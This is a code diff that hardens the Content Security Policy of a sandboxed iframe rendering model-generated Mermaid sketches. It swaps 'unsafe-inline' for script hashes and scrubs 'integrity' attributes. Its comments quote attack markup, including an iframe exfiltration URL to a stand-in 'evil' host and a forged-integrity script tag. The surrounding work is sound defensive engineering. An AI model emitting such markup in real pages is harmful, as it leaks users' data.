@@ -79,15 +79,16 @@
 //     — inline styles, no external assets, no network requests", so it has no
 //     documented need to ship JS. See
 //     `src/kiro_crew/apps/builtins/meetings/agents/meetings-sketch-artist.json`.
-//   * The residual that is left is narrow and ours: `'unsafe-inline'` is still
-//     granted, and our own bootstrap could in principle append a speculative
-//     `<link>`. It is a fixed literal in this file, not attacker input.
-//     Replacing `'unsafe-inline'` with a build-time hash of that literal would
-//     retire even that, and is the natural follow-up.
+//   * The CSP no longer grants `'unsafe-inline'`. `script-src` names the SHA-256
+//     of each script we author (the bootstrap, and in the exported file the
+//     inlined runtime), so the scrub is no longer the only thing between model
+//     markup and execution: an inline `<script>`, an `on*=` handler or a
+//     `javascript:` URL the scrub missed is refused by the browser.
 
 import { MERMAID_RUNTIME_PATH as MERMAID_RUNTIME_PATH_ROOT } from '../../../lib/vendorPaths'
 import { withBase } from '../../../lib/basePath'
 import { escapeScriptClose } from '../../../lib/widgetSrcdoc'
+import { sha256Hex } from '../../../utils/sha256Hex'
 /** The runtime's served path under this build's base (the bare path in the stock build). */
 const MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH_ROOT)
 
@@ -95,7 +96,8 @@ const MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH_ROOT)
  * CSP for the sketch frame. `scriptOrigin` is the dashboard's own origin
  * (`window.location.origin`) — a null-origin document cannot use `'self'`, so
  * the origin is spelled out. The exported file (`buildSketchExport`) passes
- * `null`: its runtime is inlined, so `script-src` is `'unsafe-inline'` alone.
+ * `null` and the hash of its inlined runtime instead: it has no origin to load
+ * the runtime from.
  *
  * Each directive, and why it is exactly this:
  *
@@ -105,18 +107,17 @@ const MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH_ROOT)
  *   `<iframe src="https://evil/?d=…">` is just as good an exfil channel as an
  *   image, and inheriting `'none'` blocks it without another directive to keep
  *   in sync.
- * - `script-src 'unsafe-inline' <origin><MERMAID_RUNTIME_PATH>` — pinned to the
- *   single vendored FILE, not to a bare origin and not to `https:`. Same
- *   least-privilege shape as `widgetSrcdoc.cspFor` pinning Tailwind: an injected
- *   document cannot pull arbitrary scripts from other dashboard endpoints, and
- *   crucially a script URL is itself an egress channel, so `script-src https:`
- *   would reopen the finding. `'unsafe-inline'` stays because OUR OWN inline
- *   bootstrap (`MERMAID_BOOTSTRAP_BODY`) is what drives Mermaid, and a `srcdoc`
- *   document has no response header to carry a nonce. Note what it no longer
- *   covers: the model's inline scripts are REMOVED from the document before it is
- *   serialized (`scrubModelDocument`), so `'unsafe-inline'` is a grant to our
- *   code, not to the model's. Replacing it with a build-time hash of that one
- *   literal is the follow-up that would retire the grant entirely.
+ * - `script-src 'sha256-<bootstrap>' <origin><MERMAID_RUNTIME_PATH>` — the
+ *   runtime is pinned to the single vendored FILE, not to a bare origin and not
+ *   to `https:`. Same least-privilege shape as `widgetSrcdoc.cspFor` pinning
+ *   Tailwind: an injected document cannot pull arbitrary scripts from other
+ *   dashboard endpoints, and crucially a script URL is itself an egress channel,
+ *   so `script-src https:` would reopen the finding. The exported file replaces
+ *   the URL with `'sha256-<runtime>'`. Inline script runs only when its text
+ *   hashes to one of OUR scripts, so `'unsafe-inline'` is NOT granted: model
+ *   markup that survives `scrubModelDocument` still cannot run (inline
+ *   `<script>`, `on*=` handlers — no `'unsafe-hashes'` — and `javascript:` URLs
+ *   are all refused). The scrub stays as defense-in-depth.
  *   `'unsafe-eval'` is NOT granted — the vendored bundle contains zero
  *   `eval(` / `new Function` / `new Worker` / `importScripts` (verified against
  *   mermaid 11.13.0's `mermaid.min.js`), so the frame gets no dynamic-exec
@@ -141,9 +142,9 @@ const MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH_ROOT)
  * - `base-uri 'none'` — a `<base href>` would re-point every relative URL in the
  *   document, including the Mermaid script path, at an attacker origin.
  */
-const cspFor = (scriptOrigin: string | null): string =>
+const cspFor = (runtimeSource: string): string =>
   "default-src 'none'; " +
-  `script-src 'unsafe-inline'${scriptOrigin === null ? '' : ` ${scriptOrigin}${MERMAID_RUNTIME_PATH}`}; ` +
+  `script-src 'sha256-${MERMAID_BOOTSTRAP_HASH}' ${runtimeSource}; ` +
   "style-src 'unsafe-inline'; " +
   "img-src data:; font-src data:; connect-src 'none'; " +
   "form-action 'none'; base-uri 'none';"
@@ -229,6 +230,26 @@ const MERMAID_BOOTSTRAP_BODY = `(function(){
   if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', start);
   else start();
 })();`
+
+/**
+ * The text a `<script>` holds once the frame re-parses the serialized document.
+ * The HTML parser turns CR / CRLF into LF and NUL into U+FFFD before a script's
+ * text exists, and a CSP hash is taken over THAT text — so the hash and the
+ * `textContent` we set must both come from this form, or our own script is refused.
+ */
+const asParsedScript = (js: string): string =>
+  js.replace(/\r\n?/g, '\n').replace(/\0/g, '\uFFFD')
+
+/** Base64 SHA-256 of a script's text, as a CSP `'sha256-…'` source wants it. */
+function cspHash(js: string): string {
+  const hex = sha256Hex(js)
+  let bytes = ''
+  for (let i = 0; i < hex.length; i += 2) bytes += String.fromCharCode(parseInt(hex.slice(i, i + 2), 16))
+  return btoa(bytes)
+}
+
+const MERMAID_BOOTSTRAP_SCRIPT = asParsedScript(MERMAID_BOOTSTRAP_BODY)
+const MERMAID_BOOTSTRAP_HASH = cspHash(MERMAID_BOOTSTRAP_SCRIPT)
 
 /**
  * Elements removed outright from the model document. Every one of them is
@@ -389,7 +410,11 @@ function scrubModelDocument(root: ParentNode): void {
     for (const attr of Array.from(el.attributes)) {
       const name = attr.name.toLowerCase()
       // Event handlers: script by another name, so they follow <script> out.
-      if (name.startsWith('on')) {
+      // `integrity` goes too: a hash source in `script-src` also admits an
+      // external script whose `integrity` names that hash, so a surviving
+      // `<script src="https://…" integrity="sha256-<ours>">` would send a request
+      // before the integrity check refuses it.
+      if (name.startsWith('on') || name === 'integrity') {
         el.removeAttribute(attr.name)
         continue
       }
@@ -471,15 +496,18 @@ export function buildSketchSrcdoc(html: string, scriptOrigin: string, inlineRunt
   // NOTE: uses a placeholder <meta> instead of a live <script> to avoid
   // happy-dom's eager script loading (ECONNREFUSED in CI). See widgetSrcdoc.ts
   // for the full rationale — same pattern.
+  let runtimeSource = `${scriptOrigin}${MERMAID_RUNTIME_PATH}`
   if (inlineRuntime === undefined) {
     const mermaidPlaceholder = doc.createElement('meta')
     mermaidPlaceholder.setAttribute('name', 'x-script-placeholder')
     mermaidPlaceholder.setAttribute('data-src', scriptOrigin + MERMAID_RUNTIME_PATH)
     head.appendChild(mermaidPlaceholder)
   } else {
+    const runtimeScript = asParsedScript(escapeScriptClose(inlineRuntime))
     const runtime = doc.createElement('script')
-    runtime.textContent = escapeScriptClose(inlineRuntime)
+    runtime.textContent = runtimeScript
     head.appendChild(runtime)
+    runtimeSource = `'sha256-${cspHash(runtimeScript)}'`
   }
 
   // Model HTML, adopted as typed DOM nodes — see the doc comment above.
@@ -503,13 +531,13 @@ export function buildSketchSrcdoc(html: string, scriptOrigin: string, inlineRunt
   // a fixed literal that interpolates nothing. It runs once the model content is
   // parsed, so `run()` sees every diagram node in the document.
   const bootstrap = doc.createElement('script')
-  bootstrap.textContent = MERMAID_BOOTSTRAP_BODY
+  bootstrap.textContent = MERMAID_BOOTSTRAP_SCRIPT
   body.appendChild(bootstrap)
 
   // LAST, and FIRST in the head: nothing above may parse before the policy.
   const csp = doc.createElement('meta')
   csp.setAttribute('http-equiv', 'Content-Security-Policy')
-  csp.setAttribute('content', cspFor(inlineRuntime === undefined ? scriptOrigin : null))
+  csp.setAttribute('content', cspFor(runtimeSource))
   head.insertBefore(csp, head.firstChild)
 
   // The one remaining template literal holds the static DOCTYPE plus the
